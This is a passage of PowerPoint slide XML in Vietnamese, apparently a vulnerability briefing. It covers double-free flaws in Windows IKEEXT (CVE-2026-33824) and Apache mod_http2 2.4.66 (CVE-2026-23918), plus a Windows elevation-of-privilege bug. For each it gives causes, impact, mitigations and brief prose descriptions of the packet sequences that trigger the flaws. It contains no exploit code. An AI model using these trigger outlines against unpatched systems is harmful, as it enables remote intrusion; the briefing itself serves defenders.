            <a:ext cx="3148584" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CVE-2025-62215</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="2514600"/>
            <a:ext cx="3148584" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="7200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>7.0</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="7200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="3703320"/>
            <a:ext cx="3148584" cy="320040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>CVSS · High</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Text 21"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="4206240"/>
            <a:ext cx="3148584" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1500" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>race condition → double free → EoP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1500" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8354568" y="5257800"/>
            <a:ext cx="3148584" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Đã khai thác · CISA KEV 12/11/2025</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CVE-2026-33824 · Windows IKE Extension</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4 · CWE-415 · CVSS 3.1 = 9.8 CRITICAL</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="3657600" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="3291840"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SẢN PHẨM BỊ ẢNH HƯỞNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="3291840" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ikeext.dll</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, dịch vụ IKEEXT (nền tảng IPsec/IKEv2 VPN) trên Windows 10/11 và Windows Server 2016–2025 chưa vá</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="3657600" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4096512"/>
            <a:ext cx="3291840" cy="22860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PHÂN LOẠI</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4389120"/>
            <a:ext cx="3291840" cy="640080"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>CWE-415</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="5166360"/>
            <a:ext cx="3291840" cy="822960"/>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AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4343400" y="1417320"/>
            <a:ext cx="3694176" cy="2743200"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="1581912"/>
            <a:ext cx="33284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NGUYÊN NHÂN</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="1874520"/>
            <a:ext cx="3328416" cy="217627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Khi lắp ghép thông điệp IKEv2 IKE_AUTH bị phân mảnh, con trỏ tới blob Security Realm (cấu trúc MMSA) bị sao chép nông sang PacketContext. Cả hai ngữ cảnh cùng free một vùng heap (phân tích của TrendAI/ZDI).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4343400" y="4389120"/>
            <a:ext cx="3694176" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="4553712"/>
            <a:ext cx="33284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ĐIỀU KIỆN KHAI THÁC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="4846320"/>
            <a:ext cx="3328416" cy="126187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Gửi IKE_SA_INIT có Security Realm Vendor ID tới UDP 500/4500, rồi các fragment IKE_AUTH (RFC 7383); lỗi xảy ra trước khi peer được xác thực</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8266176" y="1417320"/>
            <a:ext cx="3465576" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent2"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="1581912"/>
            <a:ext cx="3099816"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TÁC ĐỘNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="1874520"/>
            <a:ext cx="3099816" cy="1719072"/>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Crash IKEEXT hoặc thực thi mã trong context SYSTEM; RCE từ xa, không xác thực, không cần tương tác: wormable</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8266176" y="3931920"/>
            <a:ext cx="3465576" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="4096512"/>
            <a:ext cx="3099816" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KHẮC PHỤC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8449056" y="4389120"/>
            <a:ext cx="3099816" cy="1719072"/>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bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Bản vá Microsoft 4/2026 trở đi</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chưa vá: chặn UDP 500/4500 với host không cần IKE, giới hạn peer tin cậy</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Không expose VPN/IPsec ra Internet khi không cần</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="12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CVE-2026-23918 · Apache HTTP Server mod_http2</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4 · CWE-415 · CVSS 8.8 HIGH</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1417320"/>
            <a:ext cx="3657600" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent1"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1581912"/>
            <a:ext cx="3291840"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SẢN PHẨM BỊ ẢNH HƯỞNG</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="1874520"/>
            <a:ext cx="3291840" cy="1719072"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Apache HTTP Server 2.4.66, </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mod_http2</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>, MPM đa luồng worker/event; prefork không bị ảnh hưởng</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3931920"/>
            <a:ext cx="3657600" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3200"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent3"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4096512"/>
            <a:ext cx="3291840" cy="228600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>KHẮC PHỤC</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="640080" y="4389120"/>
            <a:ext cx="3291840" cy="1719072"/>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Nâng lên 2.4.67</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Tạm thời tắt </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>mod_http2</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="177800" indent="-177800">
              <a:spcAft>
                <a:spcPts val="500"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Chỉ 2.4.66 bị ảnh hưởng; 2.4.65 và từ 2.4.67 an toàn</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4343400" y="1417320"/>
            <a:ext cx="3694176" cy="4800600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1980"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4526280" y="1581912"/>
            <a:ext cx="3291840" cy="22860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NGUYÊN NHÂN (h2_mplx.c)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1965960"/>
            <a:ext cx="3236976" cy="621792"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:schemeClr val="accent5"/>
            </a:solidFill>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="762" tIns="762" rIns="762" bIns="762" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Courier New" pitchFamily="34" charset="0"/>
                <a:ea typeface="Courier New" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Courier New" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HEADERS rồi RST_STREAM (mã ≠ 0) trước khi mplx đăng ký stream</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6190488" y="2587752"/>
